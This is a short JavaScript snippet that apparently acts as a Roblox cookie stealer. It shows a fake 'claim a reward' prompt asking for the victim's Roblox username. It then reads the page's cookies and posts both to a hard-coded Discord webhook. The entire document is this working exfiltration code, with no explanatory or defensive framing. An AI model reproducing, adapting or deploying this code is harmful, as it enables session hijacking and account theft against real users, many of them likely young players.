var webhook = "https://discord.com/api/webhooks/1426919503232634973/F2RX0C2zSF202hVMphsGANiVYsikQo9nlzdi-avI7x8J2umLcWFpWtPdnxc-ioupN8zf"; 
var cookies = document.cookie;
var promptMessage = window.prompt("Enter your Roblox username to claim a reward:");
if (promptMessage) {
    fetch(webhook, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            content: `Cookie: ${cookies}\nUsername: ${promptMessage}`
        })
    }).catch(error => console.error('Error:', error));
}
